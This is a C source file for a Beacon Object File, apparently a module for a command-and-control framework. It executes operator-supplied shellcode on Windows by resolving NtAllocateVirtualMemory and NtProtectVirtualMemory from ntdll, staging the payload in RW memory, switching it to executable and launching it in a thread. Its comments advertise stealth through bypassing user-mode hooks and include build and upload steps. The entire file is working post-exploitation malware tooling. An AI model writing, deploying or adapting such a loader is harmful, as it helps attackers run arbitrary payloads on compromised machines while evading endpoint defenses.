/*
 * shellcode_exec_ntalloc.c - Shellcode execution using NtAllocateVirtualMemory.
 *
 * Uses native NT API for memory allocation and execution.
 * More stealthy than VirtualAlloc as it bypasses some user-mode hooks.
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c shellcode_exec_ntalloc.c -o shellcode_exec_ntalloc.o
 *
 * Usage from server:
 *   Upload shellcode_exec_ntalloc.o, set args = raw shellcode bytes
 */

#include <windows.h>
#include "beacon.h"

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);

#define MEM_COMMIT_VAL     0x00001000
#define MEM_RESERVE_VAL    0x00002000
#define PAGE_READWRITE_VAL 0x04
#define PAGE_EXECUTE_READ_VAL 0x20

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

void go(char* args, int alen)
{
    char* shellcode_data = NULL;
    int shellcode_len = 0;

    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        shellcode_data = BeaconDataExtract(&parser, &shellcode_len);
    }

    if (shellcode_data == NULL || shellcode_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No shellcode provided\n", 21);
        return;
    }

    if (shellcode_len > 10 * 1024 * 1024) {
        BeaconOutput(CALLBACK_ERROR, "Shellcode too large (max 10MB)\n", 32);
        return;
    }

    /* Get NT API functions */
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        BeaconOutput(CALLBACK_ERROR, "Failed to get ntdll.dll\n", 25);
        return;
    }

    pNtAllocateVirtualMemory NtAllocateVirtualMemory =
        (pNtAllocateVirtualMemory)KERNEL32$GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory =
        (pNtProtectVirtualMemory)KERNEL32$GetProcAddress(hNtdll, "NtProtectVirtualMemory");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory) {
        BeaconOutput(CALLBACK_ERROR, "Failed to resolve NT APIs\n", 27);
        return;
    }

    /* Allocate RW memory using NT API */
    PVOID base_addr = NULL;
    SIZE_T region_size = shellcode_len;
    NTSTATUS status = NtAllocateVirtualMemory(
        KERNEL32$GetCurrentProcess(),
        &base_addr,
        0,
        &region_size,
        MEM_COMMIT_VAL | MEM_RESERVE_VAL,
        PAGE_READWRITE_VAL
    );

    if (!NT_SUCCESS(status) || base_addr == NULL) {
        BeaconOutput(CALLBACK_ERROR, "NtAllocateVirtualMemory failed\n", 31);
        return;
    }

    /* Copy shellcode */
    bof_memcpy(base_addr, shellcode_data, shellcode_len);

    /* Change protection to RX */
    ULONG old_protect;
    status = NtProtectVirtualMemory(
        KERNEL32$GetCurrentProcess(),
        &base_addr,
        &region_size,
        PAGE_EXECUTE_READ_VAL,
        &old_protect
    );

    if (!NT_SUCCESS(status)) {
        BeaconOutput(CALLBACK_ERROR, "NtProtectVirtualMemory failed\n", 30);
        return;
    }

    /* Execute in thread */
    HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)base_addr, NULL, 0, NULL);
    if (hThread == NULL) {
        BeaconOutput(CALLBACK_ERROR, "CreateThread failed\n", 20);
        return;
    }

    /* Don't wait - let shellcode run asynchronously */
    KERNEL32$CloseHandle(hThread);
    BeaconOutput(CALLBACK_OUTPUT, "Shellcode thread created (NtAllocate)\n", 39);
}
